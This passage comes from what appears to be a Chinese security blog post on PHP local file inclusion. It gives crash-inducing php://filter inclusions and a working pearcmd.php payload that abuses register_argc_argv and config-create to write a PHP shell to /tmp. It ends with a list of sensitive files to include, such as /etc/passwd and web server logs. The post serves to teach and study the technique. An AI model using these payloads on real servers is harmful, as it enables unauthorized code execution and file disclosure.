+<p>国内的安全研究者<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfd049924258" >@王一航</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 曾发现过一个会导致PHP crash的方法：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfd049924258" >https://www.jianshu.com/p/dfd049924258</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;php://filter/string.strip_tags/resource=/etc/passwd&#x27;;</span><br></pre></td></tr></table></div></figure>
+
+<p><code>php://filter</code>中另一个可以导致crash的方法，测试代码是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpfile(urldecode(&#x27;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&#x27;));</span><br></pre></td></tr></table></div></figure>
+
+<p>不过这个crash涉及到<code>data:</code>协议，会因为<code>allow_url_include=Off</code>而失败。</p>
+
+        <h3 id="3-pear-pecl、"   >
+          <a href="#3-pear-pecl、" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-pear-pecl、" class="headerlink" title="3.pear/pecl、"></a>3.pear/pecl、</h3>
+      
+        <h4 id="什么东西"   >
+          <a href="#什么东西" class="heading-link"><i class="fas fa-link"></i></a><a href="#什么东西" class="headerlink" title="什么东西"></a>什么东西</h4>
+      <p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111282205431.png" alt="image-20211115215142909"></p>
+<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。</p>
+<p>pecl/pear中有一个文件 pearcmd.php。</p>
+
+        <h4 id="利用条件"   >
+          <a href="#利用条件" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4>
+      <p>在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
+<p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
+<p>原本它只是一个命令行工具，不在web目录下面，但是我们现在能文件包含，我们可包含到pear中，利用它的命令来做事。</p>
+
+        <h4 id="利用方法"   >
+          <a href="#利用方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4>
+      
+        <h5 id="1-config-create"   >
+          <a href="#1-config-create" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-config-create" class="headerlink" title="1.config-create"></a><strong>1.config-create</strong></h5>
+      <p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111282205433.png" alt="image-20211115215513426"></p>
+<p>利用它的一个命令，config-create来创建一个文件，它有两个参数，第一个参数是文件内容，第二个参数是写入的路径。</p>
+
+        <h5 id="2-SERVER-‘argv’"   >
+          <a href="#2-SERVER-‘argv’" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SERVER-‘argv’" class="headerlink" title="2.$_SERVER[‘argv’]"></a><strong>2.$_SERVER[‘argv’]</strong></h5>
+      <p>​    发现Docker环境下的PHP会开启<code>register_argc_argv</code>这个配置。当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。他们都是全局变量，为传递给脚本的参数数组——</p>
+<p>$argc — 传递给脚本的参数数目</p>
+<p>$argv — 传递给脚本的参数数组</p>
+<p>而$_SERVER[‘argv’]这个参数是我们可以利用的，argv是命令行参数，RFC3875中规定，如果query-string中不包含<code>=</code>，且请求是GET或HEAD，则query-string需要被作为命令行参数。<strong>也就是说，如果我们传递的参数没有键（参数名），那这个参数就会变成命令行参数argv。</strong></p>
+<p>（query-string是指我们在url中传的参数）<img src="https://storage.tttang.com/media/attachment/2021/11/01/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png" alt="image-20211101072557483.png"></p>
+<p>而pear又会去命令行中获取argv：</p>
+<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111282205434.png" alt="image-20211116005524798"></p>
+<p>所以，这就很巧了，我们传入命令行参数argv，再包含pearcmd.php来运行它，也就是运行我们传入的命令，结合它的 config-create 命令创建shell文件。</p>
+
+        <h5 id="3-payload"   >
+          <a href="#3-payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h5>
+      <p>最后，得到的payload如下：（p神的）</p>
+<p>/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<?=phpinfo()?>+/tmp/shell.php    </p>
+<p>这里的+号是空格的意思，是空格被编码变成了+号，所以最后的命令行参数就是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config-create //&lt;?=phpinfo()?&gt; /tmp/shell.php</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight http"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/shell.php</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></div></figure>
+
+<p>我自己又尝试了一下，我发现去掉<?=phpinfo()?>前面的/也可以运行：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&amp;<span class="meta">&lt;?=</span>phpinfo()<span class="meta">?&gt;</span>+/tmp/bis2.php三个参数:	file=/usr/local/lib/php/pearcmd.php    +config-create+/    <span class="meta">&lt;?=</span>phpinfo()<span class="meta">?&gt;</span>+/tmp/bis2.php</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config-create /&lt;?=phpinfo()?&gt; /tmp/shell.php</span><br></pre></td></tr></table></div></figure>
+
+<p>但是config-create / 里的/不能去掉，它应该代表的是根目录的意思，应该是一个固定的参数：</p>
+<p><img src="https://raw.githubusercontent.com/Biscuit19/PicGo/main/img/202111282205435.png" alt="image-20211116010232266"></p>
+<p>最后，shell被写到了/tmp/shell.php下，成功获取</p>
+
+        <h1 id="常用文件包含路径"   >
+          <a href="#常用文件包含路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#常用文件包含路径" class="headerlink" title="常用文件包含路径"></a>常用文件包含路径</h1>
+      <p>/etc/issue 版本</p>
+<p>/etc/passwd 密码</p>
+<p>/var/log/apache2/access.log 日志</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">Biscuit19_</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2021/11/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">http://example.com/2021/11/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></span></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/11/16/LFI-to-RCE/"><span class="paginator-prev__text">LFI_to_RCE</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E5%B8%B8%E7%94%A8%E7%AE%A1%E9%81%93%E7%AC%A6%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">
+          Windows系统常用管道符：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E6%94%AF%E6%8C%81%E7%9A%84%E7%AE%A1%E9%81%93%E7%AC%A6%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">
+          Linux系统支持的管道符：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E5%B8%B8%E7%94%A8%E7%9B%AE%E5%BD%95"><span class="toc-number">3.</span> <span class="toc-text">
+          linux常用目录:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">
+          PHP命令执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-system%E5%87%BD%E6%95%B0-%E6%9C%80%E4%BC%98%E5%85%88"><span class="toc-number">4.1.</span> <span class="toc-text">
+          1.system函数(最优先)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.</span> <span class="toc-text">
+          exec函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-exec%E5%87%BD%E6%95%B0"><span class="toc-number">4.3.</span> <span class="toc-text">
+          shell_exec函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#passthu%E5%87%BD%E6%95%B0-%E4%B9%9F%E4%BC%98%E5%85%88"><span class="toc-number">4.4.</span> <span class="toc-text">
+          passthu函数(也优先)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">5.</span> <span class="toc-text">
+          目录&#x2F;文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%93%8D%E4%BD%9C"><span class="toc-number">5.1.</span> <span class="toc-text">
+          命令行操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C"><span class="toc-number">5.1.1.</span> <span class="toc-text">
+          目录操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">5.1.2.</span> <span class="toc-text">
+          文件操作</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E6%93%8D%E4%BD%9C"><span class="toc-number">5.2.</span> <span class="toc-text">
+          php操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C-1"><span class="toc-number">5.2.1.</span> <span class="toc-text">
+          目录操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-1"><span class="toc-number">5.2.2.</span> <span class="toc-text">
+          文件操作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%98-%E2%80%98%E5%92%8C%E2%80%99-%E2%80%98"><span class="toc-number">6.</span> <span class="toc-text">
+          ‘&#x2F;‘和’\‘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">7.</span> <span class="toc-text">
+          文件包含:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-number">7.1.</span> <span class="toc-text">
+          一、包含函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81include-%E5%87%BD%E6%95%B0"><span class="toc-number">7.1.1.</span> <span class="toc-text">
+          1、include()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-require-%E5%87%BD%E6%95%B0"><span class="toc-number">7.1.2.</span> <span class="toc-text">
+          2.require()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-include-once-%E5%92%8Crequire-once-%E5%87%BD%E6%95%B0"><span class="toc-number">7.1.3.</span> <span class="toc-text">
+          3.include_once()和require_once()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">7.2.</span> <span class="toc-text">
+          二. 漏洞类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#allow-url-fopen%E5%92%8Callow-url-include%E5%AF%B9%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">7.2.1.</span> <span class="toc-text">
+          allow_url_fopen和allow_url_include对文件包含的影响</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81LFI%EF%BC%9A%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.2.2.</span> <span class="toc-text">
+          1、LFI：本地文件包含漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81RFI%EF%BC%9A%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.2.3.</span> <span class="toc-text">
+          2、RFI：远程文件包含漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">7.3.</span> <span class="toc-text">
+          三.伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#http"><span class="toc-number">7.3.1.</span> <span class="toc-text">
+          http:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ftp"><span class="toc-number">7.3.2.</span> <span class="toc-text">
+          ftp:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-input"><span class="toc-number">7.3.3.</span> <span class="toc-text">
+          php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data"><span class="toc-number">7.3.4.</span> <span class="toc-text">
+          data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#allow-url-include%E4%B8%8D%E9%9C%80%E8%A6%81ON"><span class="toc-number">7.3.5.</span> <span class="toc-text">
+          allow_url_include不需要ON</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter"><span class="toc-number">7.3.6.</span> <span class="toc-text">
+          php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file"><span class="toc-number">7.3.7.</span> <span class="toc-text">
+          file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phar"><span class="toc-number">7.3.8.</span> <span class="toc-text">
+          phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8payload"><span class="toc-number">7.3.9.</span> <span class="toc-text">
+          常用payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">8.</span> <span class="toc-text">
+          临时文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">8.1.</span> <span class="toc-text">
+          原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-session-upload-progress%E4%B8%8ESession%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">8.2.</span> <span class="toc-text">
+          1.session.upload_progress与Session文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Segfault%E9%81%97%E7%95%99%E4%B8%8BTEMP%E6%96%87%E4%BB%B6"><span class="toc-number">8.3.</span> <span class="toc-text">
+          2.[Segfault遗留下TEMP文件]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-pear-pecl%E3%80%81"><span class="toc-number">8.4.</span> <span class="toc-text">
+          3.pear&#x2F;pecl、</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E4%B8%9C%E8%A5%BF"><span class="toc-number">8.4.1.</span> <span class="toc-text">
+          什么东西</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">8.4.2.</span> <span class="toc-text">
+          利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">8.4.3.</span> <span class="toc-text">
+          利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-config-create"><span class="toc-number">8.4.3.1.</span> <span class="toc-text">
+          1.config-create</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-SERVER-%E2%80%98argv%E2%80%99"><span class="toc-number">8.4.3.2.</span> <span class="toc-text">
+          2.$_SERVER[‘argv’]</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-payload"><span class="toc-number">8.4.3.3.</span> <span class="toc-text">
+          3.payload</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%B7%AF%E5%BE%84"><span class="toc-number"></span> <span class="toc-text">
+          常用文件包含路径</span></a></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/6.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">↑在现场，我是兔子🐰</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/Biscuit19" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="Biscuit19_" target="_blank" rel="noopener" data-popover="Wechat" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weixin"></i></span></a><a class="sidebar-ov-social-item" href="https://user.qzone.qq.com/911268514/main" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">1</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Biscuit19_</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
